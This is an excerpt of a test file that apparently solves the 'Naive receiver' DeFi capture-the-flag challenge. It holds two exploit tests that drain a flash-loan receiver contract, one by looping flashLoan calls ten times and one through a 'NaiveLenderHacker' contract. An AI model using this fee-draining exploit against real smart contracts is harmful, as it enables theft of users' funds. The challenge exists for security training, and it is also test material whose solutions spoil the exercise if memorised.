...
describe('[Challenge] Naive receiver', function () {
    ...
    it('Exploit', async function () {
        ...
        for(let i = 0; i < 10; i++) {
            const tx = await this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther("10"));
            await tx.wait()
        }
    });

    it("Exploit2", async function() {
        const hackContractFactory = await ethers.getContractFactory("NaiveLenderHacker");
        const hackContract = await hackContractFactory.deploy(this.pool.address, this.receiver.address);        
        const tx = await hackContract.hack();
        await tx.wait();
    })
